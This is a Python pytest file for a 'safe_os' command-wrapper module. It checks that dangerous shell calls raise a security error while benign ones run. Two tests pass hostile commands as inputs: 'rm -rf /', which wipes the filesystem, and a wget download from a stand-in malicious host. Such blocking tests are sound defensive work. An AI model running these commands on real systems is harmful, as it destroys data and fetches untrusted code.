import pytest
from arkhe_stdlib import ArkheSecurityError
from arkhe_stdlib import safe_os

def test_safe_os_system_blocked():
    with pytest.raises(ArkheSecurityError) as exc:
        safe_os.system('rm -rf /')
    assert "DESTRUCTIVE_COMMAND" in str(exc.value)

def test_safe_os_system_allowed():
    # Should not raise exception
    res = safe_os.system('ls -la > /dev/null')
    assert res == 0

def test_safe_os_popen_blocked():
    with pytest.raises(ArkheSecurityError) as exc:
        safe_os.popen('wget http://malicious.com')
    assert "DESTRUCTIVE_COMMAND" in str(exc.value)

def test_safe_os_getattr_transparent():
    # Deve expor funções que não foram wrappadas
    assert hasattr(safe_os, 'path')
    assert safe_os.environ is not None
